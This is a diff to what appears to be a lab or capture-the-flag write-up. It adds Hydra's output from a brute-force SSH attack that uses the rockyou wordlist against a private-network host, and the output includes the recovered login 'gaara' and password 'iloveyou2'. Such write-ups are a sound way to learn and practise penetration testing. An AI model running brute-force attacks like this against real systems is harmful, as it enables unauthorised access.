@@ -192,5 +192,14 @@ Brute-force SSH Password for User
 > hydra -l gaara -P /usr/share/wordlists/rockyou.txt 192.168.166.142 ssh
 ```
 ```
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-11-04 02:59:55
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking ssh://192.168.166.142:22/
+[STATUS] 150.00 tries/min, 150 tries in 00:01h, 14344250 to do in 1593:49h, 15 active
+[22][ssh] host: 192.168.166.142   login: gaara   password: iloveyou2
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-11-04 03:01:45
 ```
